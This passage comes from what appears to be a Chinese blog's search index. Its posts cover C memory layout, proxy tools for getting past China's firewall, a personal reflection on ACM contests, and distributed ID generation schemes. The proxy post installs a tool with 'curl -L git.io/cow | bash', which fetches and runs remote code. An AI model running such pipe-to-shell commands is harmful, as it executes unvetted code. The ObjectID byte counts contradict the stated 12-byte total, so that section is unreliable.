class=\"comment\">// heap m = 14324</span></span><br></pre></td></tr></table></figure>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>segment</th>\n<th>段名</th>\n<th>内容</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>BSS</td>\n<td>BSS段</td>\n<td>存放程序中未初始化的全局变量，不占用执行程序大小，其内容由操作系统初始化（赋0）</td>\n</tr>\n<tr>\n<td>data</td>\n<td>数据段</td>\n<td>存放程序中已初始化的全局变量</td>\n</tr>\n<tr>\n<td>code</td>\n<td>代码段</td>\n<td>存放程序执行代码的内存区域，大小在程序运行前已经确定，而且通常属于只读</td>\n</tr>\n<tr>\n<td>heap</td>\n<td>堆</td>\n<td>存放进程运行中被动态分配的内存段，大小并不固定，可动态扩张或缩减，malloc分配的是堆上内存</td>\n</tr>\n<tr>\n<td>stack</td>\n<td>栈</td>\n<td>用户存放程序临时创建的局部变量（但不包括static声明的变量）。在函数被调用时，其参数也会被压入发起调用的进程栈</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>TODO::用<code>objdump -s</code>分析二进制</p>\n<h2 id=\"常见的坑\"><a href=\"#常见的坑\" class=\"headerlink\" title=\"常见的坑\"></a>常见的坑</h2><h3 id=\"变量的定义与声明\"><a href=\"#变量的定义与声明\" class=\"headerlink\" title=\"变量的定义与声明\"></a>变量的定义与声明</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a = <span class=\"number\">0</span>; <span class=\"comment\">//定义，声明了类型、名称，同时分配空间和初始化</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"keyword\">int</span> a; <span class=\"comment\">//声明，变量在其他地方</span></span><br></pre></td></tr></table></figure>\n<p>变量申明仅表明对象的类型和名称，而定义还会给变量分配空间和初始化值，定义也是声明。声明可以有多次，定义只能有一次。</p>\n<h3 id=\"switch\"><a href=\"#switch\" class=\"headerlink\" title=\"switch\"></a>switch</h3><p><code>switch(variable)</code>变量只能是<code>char</code>，<code>int</code>类型，<code>case</code>总常量值不能重复。分支语句块如果重复可以改为：<br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">switch</span>(variable) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">case</span> VAR1:</span><br><span class=\"line\">  <span class=\"keyword\">case</span> VAR2: &#123;</span><br><span class=\"line\">    <span class=\"comment\">// do something...</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"不能返回栈上值的引用\"><a href=\"#不能返回栈上值的引用\" class=\"headerlink\" title=\"不能返回栈上值的引用\"></a>不能返回栈上值的引用</h3><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">string&amp; <span class=\"title\">shorter</span><span class=\"params\">(string&amp; s1, string&amp; s2)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(s1.<span class=\"built_in\">size</span>() &lt; s2.<span class=\"built_in\">size</span>()) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s1;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s2;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当函数执行完后，栈上对象会被析构。返回引用类型时，不能返回栈上对象的引用。</p>\n<h3 id=\"对象生命周期\"><a href=\"#对象生命周期\" class=\"headerlink\" title=\"对象生命周期\"></a>对象生命周期</h3><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">string s = <span class=\"string\">&quot;HelloWorld&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">char</span> *p1 = s.<span class=\"built_in\">substr</span>(<span class=\"number\">1</span>).<span class=\"built_in\">data</span>();</span><br><span class=\"line\">cout &lt;&lt; p1 &lt;&lt; endl; <span class=\"comment\">// elloWorld</span></span><br><span class=\"line\"><span class=\"keyword\">char</span> *p2 = s.<span class=\"built_in\">substr</span>(<span class=\"number\">1</span>).<span class=\"built_in\">data</span>();</span><br><span class=\"line\">cout &lt;&lt; p2 &lt;&lt; endl; <span class=\"comment\">// elloWorld</span></span><br></pre></td></tr></table></figure>\n<p>参考资料:</p>\n<ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/359775573?ivk_sa=1024320u\">C语言未初始化的局部变量必懂</a></li>\n<li><a href=\"https://blog.csdn.net/snowhuit/article/details/120104786\">C语言内存布局理解</a></li>\n</ul>\n","tags":["C"]},{"title":"关于墙的若干问题","url":"/2019/05/25/%E5%85%B3%E4%BA%8E%E5%A2%99%E7%9A%84%E8%8B%A5%E5%B9%B2%E9%97%AE%E9%A2%98/","content":"<blockquote>\n<p>这里整理一些由于我国国情导致的导致的生产环境恶劣的问题</p>\n</blockquote>\n<ul>\n<li>环境：Arch Linux</li>\n</ul>\n<p>解决墙的问题一般也就是梯子，而梯子的原理则是开两个服务，一个跑在远端vps，一个跑在本地，中间通信加密。我常用的梯子是sock5协议的shadowsocks</p>\n<h2 id=\"proxychain\"><a href=\"#proxychain\" class=\"headerlink\" title=\"proxychain\"></a>proxychain</h2><p>arch下的安装：<code>sudo pacman -S proxychains-ng</code>，修改配置：<code>cat /etc/proxychains.conf</code>，假设我们的本地代理跑在127.0.0.1:1080<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[ProxyList]</span><br><span class=\"line\"># add proxy here ...</span><br><span class=\"line\"># meanwile</span><br><span class=\"line\"># defaults set to &quot;tor&quot;</span><br><span class=\"line\">#socks4         127.0.0.1 9050</span><br><span class=\"line\">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure><br>运行firefox：<code>proxychains firefox</code>，使用代理打开浏览器。</p>\n<span id=\"more\"></span>\n<h2 id=\"Cow\"><a href=\"#Cow\" class=\"headerlink\" title=\"Cow\"></a>Cow</h2><p>golang.org也被墙了，下载一些开发库的时候，这些库可能直接或者间接引用了 <code>golang.org/x/...</code>等依赖库， 通过<code>go get</code>命令确没有办法下载下来。</p>\n<p>解决问题的方法是https代理，然而shadowsocks只能开启socks5代理，shadowsocks_go的作者还写了另一个工具：<a href=\"https://github.com/cyfdecyf/cow/\">cow</a> ，可以在本地开启一个https代理服务器，作为ss的二级代理。</p>\n<p>下载：<code>curl -L git.io/cow | bash</code>，修改配置<code>~/.cow/rc</code>：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#假设sss代理是1080</span></span><br><span class=\"line\">listen = http://127.0.0.1:7777</span><br><span class=\"line\">proxy = socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure><br>此时相当与<code>127.0.0.1:7777</code>开启了一个https代理。<br>然后设置环境变量，就可以go get被屏蔽的库了。<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> http_proxy=http://127.0.0.1:7777</span><br><span class=\"line\"><span class=\"built_in\">export</span> https_proxy=http://127.0.0.1:7777</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"privoxy\"><a href=\"#privoxy\" class=\"headerlink\" title=\"privoxy\"></a>privoxy</h2><p>这是archwiki上推荐的一款工具，类似cow可以转化socks5协议为https，安装：<code>sudo pacman -S privoxy</code>，配置：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#本地socks5监听</span><br><span class=\"line\">forward-socks5 / 127.0.0.1:1080 .</span><br><span class=\"line\">#默认https监听8010</span><br><span class=\"line\">listen-address  127.0.0.1:8010 </span><br></pre></td></tr></table></figure><br>然后以守护进程启动：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl start privoxy</span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> privoxy</span><br></pre></td></tr></table></figure><br>此时只需要<code>https_proxy=127.0.0.1:8010 http_proxy=127.0.0.1:8010</code>作为前缀运行shell中的命令即可开启代理</p>\n","tags":["科学上网"]},{"title":"写在大学的三分之一","url":"/2017/11/03/%E5%86%99%E5%9C%A8%E5%A4%A7%E5%AD%A6%E7%9A%84%E4%B8%89%E5%88%86%E4%B9%8B%E4%B8%80/","content":"<h1 id=\"写在大学的三分之一\"><a href=\"#写在大学的三分之一\" class=\"headerlink\" title=\"写在大学的三分之一\"></a>写在大学的三分之一</h1><p>从哈尔滨打铁耻辱回程，本该早早发篇文章反省的，却因为一系列的不可控事件（概率论考试什么的。。。）拖到今天。</p>\n<p>距离大学刚军训完踏入304的那天起，已经走过了一年。当时我在ACM新手群水群，自称“有OI基础”，（实际上也就是个初赛都过不了的滑水的），然后就被大腿带去304的ACM基地，第一次看到了乱七八糟的训练室，白板上涂鸦着List学长的画像，被告知ACM比赛的队员就在这里比赛，甚至就住这里，感觉立马不想参加了。。。之后，就被安排了第一场新生赛。第一场比赛，学校的OJ还只支持C／C++，只会一点pascal的我立马慌了，挨着面子没有揭露我这个“伪OIer”的身份。高中的NOIP屡受挫折，也得不到家长支持，付出了对我而言挺大的代价，却没有收获，于是大学不再想跳坑。因为没有打算将来去打比赛，z直到新生赛那天，才开始看C的语法，一边搜题目，对应着pascal的思路一行行翻译成C（实际上，感谢这场比赛，奇迹般的让我在5个小时内学会了大部分的大一C语言语法）。比赛结果，被高中国奖的大腿屠榜无误。。。<br><span id=\"more\"></span></p>\n<p>之后因为ACM开了拉风又嚣张的选修课（借此翘掉了自习课），于是参加了新生的培训，一路上踩着高中的那点基础，初始几节课还能位列rank前列。然而，我就这样躺在了高中的经验上，大一上水了一年，在王者荣耀中浪费了一个寒假，而开学后，别人早已掌握了红黑树。。。</p>\n<p>大一下，又入了数模的坑，一边自欺欺人“做项目”，一边王者荣耀，继续浪费宝贵的时间，直到校赛被很多无基础的超过，才知道和别人已经拉开了差距。校赛惨淡的AC数让我以为无缘校队，无缘区预赛时，某天晚上，名单出来，却位列最后几名意外的进了预备役，暑假也无事可做，赖在学校“训练”，一赖就赖到今天。</p>\n<p>几次的网赛，感受到被对手碾压，做两个小时就咸鱼得开始划水。但多亏了茅神，最终咸鱼队混得一个哈尔滨的名额。到了比赛现场，才知道什么是真正的绝望。</p>\n<p>左边一队清华，队友说：你座靠他们，看看能套到什么情报。比赛开始后，当我们还在看题时，左边已经升起一个气球了。接下来几个小时，左边没有讨论，没有任何多余动作：看题，换座，单杀，AC。我们队还在研究如何调出Eclipse的Console，如何看文档手动补全。忙到最后，只A一题，左边已经花花绿绿的一片气球了。</p>\n<p>我当时思考，如果我没有把精力放在ACM上，反之投放于数模，跟着前美赛大佬的部长混，说不定能抱得O奖归，保研，光宗耀祖。而算法竞赛消耗着大量时间精力，晚上顶住舍友的压力打CF，假期面对家长和队里的两面施压。但是，ACM吸引我的，并不是他的金牌保研，也不是就业，而是比赛本身，和那群人啊。</p>\n<p>比起某某玄学比赛，队友装逼不懂装懂，和队友闹翻，互相甩锅，然而在ACM里绝不会这样：Talk is cheap, show me your code。<br>“一个人很强，首先是因为他的三观很正”，“努力提高个人实力”，“做技术不求与人”。正是在这里遇见了公正的教练，先锋的大佬们，让我看清了外面的世界，也让我在迷茫和昏暗的大一找到了自己的方向。</p>\n<p>2018 加油啊，至少不能铁牌退役啊！一定要再次出去看看漂亮的小姐姐啊！（逃</p>\n","tags":["一点牢骚"]},{"title":"分布式ID的几种生成方案","url":"/2021/03/30/%E5%88%86%E5%B8%83%E5%BC%8FID%E7%9A%84%E5%87%A0%E7%A7%8D%E7%94%9F%E6%88%90%E6%96%B9%E6%A1%88/","content":"<p>分布式系统中往往涉及生成唯一ID的业务：例如多个模块产生一类数据库的记录，需要保证记录的ID互不冲突。较优的ID生成规则往往需要满足：</p>\n<ul>\n<li>唯一性：生成的ID全局上唯一，冲突的概率几乎为0</li>\n<li>有序性：生成的ID按照某种规则有序，便于数据库的插入和排序</li>\n<li>可用性：在高并发下依然能正确生成唯一的ID</li>\n<li>高性能：每次生成唯一ID的相应速度要快</li>\n<li>自主性：不依赖中心认证即可自主生成唯一的ID</li>\n<li>安全性：不暴露系统和业务相关信息</li>\n</ul>\n<p>这里总结一下主要的ID生成方案。<br><span id=\"more\"></span></p>\n<h2 id=\"UUID\"><a href=\"#UUID\" class=\"headerlink\" title=\"UUID\"></a>UUID</h2><p>UUID全称通用唯一识别码 (Universally Unique Identifier），是一个由<strong>机器编码</strong>，<strong>时间</strong>和<strong>时钟编号</strong>等生成的全网唯一编码。</p>\n<p>UUID由以下几部分的组合：</p>\n<ol>\n<li>当前日期和时间。UUID的第一个部分与时间有关，如果你在生成一个UUID之后，过几秒又生成一个UUID，则第一个部分不同，其余相同。</li>\n<li>时钟序列。</li>\n<li>全局唯一的IEEE机器识别号，如果有网卡，从网卡MAC地址获得，没有网卡以其他方式获得。</li>\n</ol>\n<p>关于UUID这个标准使用最普遍的是微软的GUID(Globals Unique Identifiers)。标准的UUID格式为：<code>xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx</code> (8-4-4-4-12)。它能保证每个节点所生成的标识都不会重复，并且随着WEB服务等整合技术的发展，UUID的优势将更加明显。根据使用的特定机制，UUID最少在3000+年内不会重复。</p>\n<p><strong>优点</strong>：</p>\n<ul>\n<li>生成简单，无需配置</li>\n<li>无需中心服务支持，本地进行，没有网络消耗。</li>\n</ul>\n<p><strong>缺点</strong>：</p>\n<ul>\n<li>生成的结果串长达36字节，作为主键使得MySQL查询效率低</li>\n<li>基于MAC地址的UUID生成算法可能会泄露MAC地址</li>\n<li>无需字符串作为ID，无法排序</li>\n</ul>\n<p>用Jdk 1.5后提供了UUID的生成：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">    String uuid = UUID.randomUUID().toString();</span><br><span class=\"line\">    System.out.println(uuid);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 6a498e42-55fc-42f4-8328-d6658e5f82db</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"MongoDB的ObjectID算法\"><a href=\"#MongoDB的ObjectID算法\" class=\"headerlink\" title=\"MongoDB的ObjectID算法\"></a>MongoDB的ObjectID算法</h2><p>MongoDB采用12字节的字符串作为生成的ID。其中被划分位4段：</p>\n<ul>\n<li>4字节：秒级UNIX时间戳（Timestamp）</li>\n<li>3字节：主机唯一标识符（Machine ID）</li>\n<li>2字节：同一机器，不同进程产生的进程标识符（PID）</li>\n<li>6字节：随机数计数器，在同一机器同一秒内自增，确保同一秒内产生的ID不冲突（Increment）</li>\n</ul>\n<p>使用16进制字符串和-表示ObjectID，例：<code>5dba76a3-d2c366-7f99-57dfb0</code>表示：</p>\n<ul>\n<li>Timestamp：1572501155</li>\n<li>MachineId：13812582</li>\n<li>pid：32665</li>\n<li>Increment：5758896</li>\n</ul>\n<p>MongoDB的ObjectID作为分布式ID，和UUID的原理类似，优缺点也类似：</p>\n<p><strong>优点</strong>：</p>\n<ul>\n<li>本地生产，无需网络消耗，使用简单，没有高可用风险</li>\n<li>生成的ID中包含了时间信息</li>\n</ul>\n<p><strong>缺点</strong>：</p>\n<ul>\n<li>字符串ID占用12字节，不易储存，降低了查询性能</li>\n</ul>\n<blockquote>\n<p>MongoDB 3.4前的Machine ID生成规则是：对<code>hostname</code>去hash后的前几位，PID的生成规则是直接取进程号。但是随着虚拟化技术的发展，大量服务部署的环境<code>hostname</code>都是<code>localhost</code>，用容器部署的服务，由于容器中只有一个进程，PID一直为1，所以使得这两个字段不能区分不同节点的服务。3.4后Machine ID和PID都采用了随机数。</p>\n</blockquote>\n<h2 id=\"数据库自增ID\"><a href=\"#数据库自增ID\" class=\"headerlink\" title=\"数据库自增ID\"></a>数据库自增ID</h2><p>用Oracle的触发器或者MySQL的<code>AUTO_INCREMENT</code>实现插入时获取自增ID。</p>\n<p><strong>优点</strong>：</p>\n<ul>\n<li>产生的ID有序，便于排序</li>\n</ul>\n<p><strong>缺点</strong>：</p>\n<ul>\n<li>抗并发性不好，数据库压力大，数据库容易成为性能瓶颈</li>\n<li>数据根据插入的先后严格自增，容易泄露数据量，容易被爬虫爬取数据。</li>\n<li>无法维持高可用性：一般数据库都是读写分离，一主多从。插入数据获取ID是写操作，需要主库参与，一旦主库故障，系统就无法正常运行了。</li>\n</ul>\n<p>可以用以下的几种方案弥补数据库生成自增ID的缺陷：</p>\n<h3 id=\"数据库按初始值和步长水平拆分\"><a href=\"#数据库按初始值和步长水平拆分\" class=\"headerlink\" title=\"数据库按初始值和步长水平拆分\"></a>数据库按初始值和步长水平拆分</h3><p>例如：将插入负载分配到3台数据库上，设置三台的ID的初始值分别为1,2,3。设置三台ID的增长步长为3:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># MySQL1</span><br><span class=\"line\">set @@auto_increment_offset = 1;     -- 起始值</span><br><span class=\"line\">set @@auto_increment_increment = 3;  -- 步长</span><br><span class=\"line\"></span><br><span class=\"line\"># MySQL2</span><br><span class=\"line\">set @@auto_increment_offset = 2;     -- 起始值</span><br><span class=\"line\">set @@auto_increment_increment = 3;  -- 步长</span><br><span class=\"line\"></span><br><span class=\"line\"># MySQL3</span><br><span class=\"line\">set @@auto_increment_offset = 3;     -- 起始值</span><br><span class=\"line\">set @@auto_increment_increment = 3;  -- 步长</span><br></pre></td></tr></table></figure><br>则三台数据库产生的ID分别为：<br><img src=\"1.png\" alt=\"\"></p>\n<p>每台数据库能生成的ID是互不冲突的，而且防止了写入的单点故障。但是这种方案需要事先根据实际的数据量需求确定水平拆分的数量，不然很容易造成后期初始值分配耗尽，集群难以再扩容的问题。以上面的3节点集群为例，如果后续要再加入一个节点，需要停机修改所有节点的步长，并把初始值设置的大于当前最大ID。</p>\n<h3 id=\"基于数据库的号段模式\"><a href=\"#基于数据库的号段模式\" class=\"headerlink\" title=\"基于数据库的号段模式\"></a>基于数据库的号段模式</h3><p>号段模式是当下分布式ID生成器的主流实现方式之一，号段模式可以理解为从数据库批量的获取自增ID，每次从数据库取出一个号段范围，例如 (1,1000] 代表1000个ID，具体的业务服务将本号段，生成1~1000的自增ID并加载到内存。表结构如下：<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> id_generator (</span><br><span class=\"line\">  id <span class=\"type\">int</span>(<span class=\"number\">10</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span>,</span><br><span class=\"line\">  max_id <span class=\"type\">bigint</span>(<span class=\"number\">20</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> COMMENT <span class=\"string\">&#x27;当前最大可用的id&#x27;</span>,</span><br><span class=\"line\">  step <span class=\"type\">int</span>(<span class=\"number\">20</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> COMMENT <span class=\"string\">&#x27;号段的布长&#x27;</span>,</span><br><span class=\"line\">  biz_type <span class=\"type\">int</span>(<span class=\"number\">20</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> COMMENT <span class=\"string\">&#x27;业务类型&#x27;</span>,</span><br><span class=\"line\">  version <span class=\"type\">int</span>(<span class=\"number\">20</span>) <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> COMMENT <span class=\"string\">&#x27;版本号，乐观锁，每次都更新version，保证并发时数据的正确性&#x27;</span>,</span><br><span class=\"line\">  <span class=\"keyword\">PRIMARY</span> KEY (`id`)</span><br><span class=\"line\">) </span><br></pre></td></tr></table></figure><br>等这批号段ID用完，再次向数据库申请新号段，对<code>max_id</code>字段做一次<code>update</code>操作，<code>update max_id = max_id + step</code>，<code>update</code>成功则说明新号段获取成功，新的号段范围是<code>(max_id ,max_id +step]</code>。<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">update id_generator </span><br><span class=\"line\"><span class=\"keyword\">set</span> max_id <span class=\"operator\">=</span> #&#123;max_id<span class=\"operator\">+</span>step&#125;, version <span class=\"operator\">=</span> version <span class=\"operator\">+</span> <span class=\"number\">1</span> </span><br><span class=\"line\"><span class=\"keyword\">where</span> version <span class=\"operator\">=</span> #&#123;version&#125; <span class=\"keyword\">and</span> biz_type <span class=\"operator\">=</span> XXX</span><br></pre></td></tr></table></figure></p>\n<p><strong>缺点</strong></p>\n<ul>\n<li>单点故障服务器重启会丢失内存中分配到的ID号段，下次重新获得号段，造成ID不连续。</li>\n</ul>\n<p><strong>优点</strong>：</p>\n<ul>\n<li>不强依赖于数据库，不会频繁的访问数据库，有效减轻了数据库的压力</li>\n<li>数据库故障后还可以支撑一段时间</li>\n</ul>\n<h2 id=\"基于Redis生成ID\"><a href=\"#基于Redis生成ID\" class=\"headerlink\" title=\"基于Redis生成ID\"></a>基于Redis生成ID</h2><p>Redis所有命令是单线程的，本身提供<code>INCR</code>，<code>INCREBY</code>这样的自增原子命令，所以能保障生成的ID是唯一有序的。</p>\n<p><strong>优点</strong>：</p>\n<ul>\n<li>不依赖数据库，且性能更高</li>\n<li>生成的ID天然有序，利于分页和排序</li>\n</ul>\n<p><strong>缺点</strong>：</p>\n<ul>\n<li>基于Redis生成本质上还是没有摆脱中心服务器的限制，依然没有解决高可用的问题。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt; set seq_id 1     // 初始化自增ID为1</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6379&gt; incr seq_id      // 增加1，并返回递增后的数值</span><br><span class=\"line\">(integer) 2</span><br></pre></td></tr></table></figure>\n<p>用Java编程的使用可以使用<code>RedisAtomicLong</code>的<code>addAndGet()</code>方法。</p>\n<p>用Redis实现需要注意一点，要考虑到Redis持久化的问题。Redis有两种持久化方式RDB和AOF：</p>\n<ul>\n<li>RDB会定时打一个快照进行持久化，假如连续自增但Redis没及时持久化，而这会Redis挂掉了，重启Redis后会出现ID重复的情况。</li>\n<li>AOF会对每条写命令进行持久化，即使Redis挂掉了也不会出现ID重复的情况，但由于<code>INCR</code>命令的特殊性，会导致Redis重启恢复的数据时间过长。</li>\n</ul>\n<p>当数据量很大的时候，还可以仿照上述MySQL的方案配置Redis集群来获得更好的吞吐量。Redis生成ID适合处理每日从0增长的流水号：先获取当日日期<code>yyyyMMdd</code>，和一串开始数字<code>000000001</code>，每次用<code>INCR</code>累加数字，生成一个流水号。</p>\n<h2 id=\"SnowFlake\"><a href=\"#SnowFlake\" class=\"headerlink\" title=\"SnowFlake\"></a>SnowFlake</h2><p>雪花算法（Snowflake）是Twiiter的分布式项目ID生成算法，在改算法影响下，国内各公司陆续开发出各具特色的分布式ID生成器。<br><img src=\"3.png\" alt=\"\"><br>Snowflake生成的是一个8字节的Long类型ID。</p>\n<ul>\n<li>因为Long类型是带符号数，为了使ID一直为正数，第一个bit位一直为0。</li>\n<li>41bit是<strong>毫秒</strong>级时间戳，时间戳不取当前时间戳，而是存：当前时间戳 - 固定开始时间戳。从0开始的41位时间戳可以用69年。</li>\n<li>10bit是工作机器ID（workId），可以容纳1024个机器</li>\n<li>12bit是序列号，支持<strong>同一机器同一毫秒内</strong>生成4096个ID</li>\n</ul>\n<p>综上：Snowflake支持同一毫秒内生成$2^{22}$个ID，支持1024个机器工作69年。</p>\n<p><strong>优点</strong>：</p>\n<ul>\n<li>生成的ID简短（只要一个8字节的Long类型即可容纳）</li>\n<li>ID是总体增长的，便于排序，但又不是严格连续的，不会泄露数据总量</li>\n<li>不需要中心节点的调度，每台节点完成workId和开始时间的配置后，可以在本地执行ID生成任务。</li>\n</ul>\n<p><strong>缺点</strong>：</p>\n<ul>\n<li>Snowflake算法强依赖于时间，如果发生时钟回拨，可能会引起ID重复，所以建议关闭时钟同步。</li>\n</ul>\n<p>实现代码如下：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SnowFlakeShortUrl</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 起始的时间戳</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"keyword\">long</span> START_TIMESTAMP = <span class=\"number\">1480166465631L</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 每一部分占用的位数</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"keyword\">long</span> SEQUENCE_BIT = <span class=\"number\">12</span>;   <span class=\"comment\">//序列号占用的位数</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"keyword\">long</span> MACHINE_BIT = <span class=\"number\">5</span>;     <span class=\"comment\">//机器标识占用的位数</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"keyword\">long</span> DATA_CENTER_BIT = <span class=\"number\">5</span>; <span class=\"comment\">//数据中心占用的位数</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 每一部分的最大值</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"keyword\">long</span> MAX_SEQUENCE = -<span class=\"number\">1L</span> ^ (-<span class=\"number\">1L</span> &lt;&lt; SEQUENCE_BIT);</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"keyword\">long</span> MAX_MACHINE_NUM = -<span class=\"number\">1L</span> ^ (-<span class=\"number\">1L</span> &lt;&lt; MACHINE_BIT);</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"keyword\">long</span> MAX_DATA_CENTER_NUM = -<span class=\"number\">1L</span> ^ (-<span class=\"number\">1L</span> &lt;&lt; DATA_CENTER_BIT);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 每一部分向左的位移</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"keyword\">long</span> MACHINE_LEFT = SEQUENCE_BIT;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"keyword\">long</span> DATA_CENTER_LEFT = SEQUENCE_BIT + MACHINE_BIT;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> <span class=\"keyword\">long</span> TIMESTAMP_LEFT = DATA_CENTER_LEFT + DATA_CENTER_BIT;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">long</span> dataCenterId;  <span class=\"comment\">//数据中心</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">long</span> machineId;     <span class=\"comment\">//机器标识</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">long</span> sequence = <span class=\"number\">0L</span>; <span class=\"comment\">//序列号</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">long</span> lastTimeStamp = -<span class=\"number\">1L</span>;  <span class=\"comment\">//上一次时间戳</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">long</span> <span class=\"title\">getNextMill</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">long</span> mill = getNewTimeStamp();</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (mill &lt;= lastTimeStamp) &#123;</span><br><span class=\"line\">            mill = getNewTimeStamp();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mill;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">long</span> <span class=\"title\">getNewTimeStamp</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> System.currentTimeMillis();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 根据指定的数据中心ID和机器标志ID生成指定的序列号</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> dataCenterId 数据中心ID</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> machineId    机器标志ID</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span 